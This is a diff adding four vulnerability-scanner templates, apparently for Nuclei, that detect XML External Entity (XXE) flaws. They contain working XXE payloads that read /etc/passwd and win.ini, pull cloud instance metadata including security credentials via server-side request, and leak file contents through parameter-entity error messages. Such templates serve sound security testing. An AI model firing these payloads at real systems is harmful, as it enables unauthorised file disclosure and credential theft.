@@ -1,0 +1,160 @@
+id: xxe-file-read
+
+info:
+  name: XML External Entity (XXE) - File Read
+  author: ancarna
+  severity: high
+  description: Detects XXE vulnerabilities allowing local file disclosure
+  tags: xxe,injection,xml,owasp-top10
+  classification:
+    cwe-id: 611
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root>
+        <data>&xxe;</data>
+      </root>
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "[a-z_][a-z0-9_-]*:x?:[0-9]+:[0-9]+:"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+      ]>
+      <root>
+        <data>&xxe;</data>
+      </root>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: or
+
+---
+id: xxe-ssrf
+
+info:
+  name: XML External Entity (XXE) - SSRF
+  author: ancarna
+  severity: high
+  description: Detects XXE vulnerabilities allowing server-side requests
+  tags: xxe,ssrf,xml
+  classification:
+    cwe-id: 611
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+      ]>
+      <root>
+        <data>&xxe;</data>
+      </root>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "security-credentials"
+        condition: or
+
+---
+id: xxe-parameter-entity
+
+info:
+  name: XML External Entity (XXE) - Parameter Entity
+  author: ancarna
+  severity: high
+  description: Detects XXE using parameter entities for data exfiltration
+  tags: xxe,xml,oob
+  classification:
+    cwe-id: 611
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY exfil SYSTEM 'file:///nonexistent/%file;'>">
+        %eval;
+      ]>
+      <root>&exfil;</root>
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "No such file or directory"
+          - "failed to load external entity"
+
+---
+id: xxe-doctype-detection
+
+info:
+  name: XXE - DOCTYPE Processing Detection
+  author: ancarna
+  severity: info
+  description: Detects if XML parser processes DOCTYPE declarations (prerequisite for XXE)
+  tags: xxe,xml,detection
+  classification:
+    cwe-id: 611
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}{{path}}"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY test "XXE_TEST_ENTITY">
+      ]>
+      <root>
+        <data>&test;</data>
+      </root>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "XXE_TEST_ENTITY"
